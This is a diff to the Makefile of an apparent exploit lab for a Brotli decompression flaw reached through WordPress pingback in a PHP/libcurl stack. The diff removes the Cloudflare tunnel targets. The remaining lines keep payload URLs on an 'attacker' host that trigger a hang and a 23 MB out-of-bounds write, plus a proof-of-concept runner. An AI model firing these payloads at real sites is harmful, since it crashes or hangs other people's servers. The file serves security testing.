@@ -10,7 +10,7 @@ HANG_PAYLOAD ?= http://attacker:8080/small.br
 CRASH_PAYLOAD ?= http://attacker:8080/payload.br
 POC := python3 poc/pingback_poc.py
 
-.PHONY: help up down reset init probe hang crash logs verify tunnel tunnel-url payloads clean
+.PHONY: help up down reset init probe hang crash logs verify payloads clean
 
 help:
 	@echo "brotli-pingback-lab"
@@ -21,9 +21,6 @@ help:
 	@echo "  make crash       send the 23 MB OOB-write payload"
 	@echo "  make logs        follow php-fpm / nginx logs"
 	@echo "  make verify      confirm the PHP/libcurl/Brotli stack is vulnerable"
-	@echo "  make tunnel      start a Cloudflare Quick Tunnel for the payload server"
-	@echo "                   (Cloudflare decodes br; use the local URL for the crash)"
-	@echo "  make tunnel-url  print the trycloudflare.com URL from the tunnel logs"
 	@echo "  make down        stop the lab (keeps volumes)"
 	@echo "  make reset       stop the lab and delete the database/WordPress volumes"
 	@echo ""
@@ -65,25 +62,6 @@ logs:
 
 verify:
 	./scripts/verify-vulnerable.sh
-
-tunnel:
-	$(COMPOSE) --profile tunnel up -d cloudflared
-	@echo ""
-	@echo "[!] Cloudflare decodes Content-Encoding: br at the edge."
-	@echo "    /small.br becomes 16 MiB of 'A'; /payload.br becomes 0 bytes."
-	@echo "    Use the local attacker URL for the crash/hang; the tunnel is for"
-	@echo "    public-URL/SSRF testing. See docs/cloudflare.md."
-	@echo ""
-	@echo "[*] Waiting for the Quick Tunnel URL ..."
-	@for i in $$(seq 1 30); do \
-		url=$$($(COMPOSE) logs --no-color cloudflared 2>&1 | grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' | tail -1); \
-		if [ -n "$$url" ]; then echo "[+] $$url"; exit 0; fi; \
-		sleep 1; \
-	done; \
-	echo "[!] URL not found yet; run: make tunnel-url"
-
-tunnel-url:
-	@$(COMPOSE) logs --no-color cloudflared 2>&1 | grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' | tail -1
 
 payloads:
 	python3 lab/attacker/payload.py hang lab/attacker/hang.br
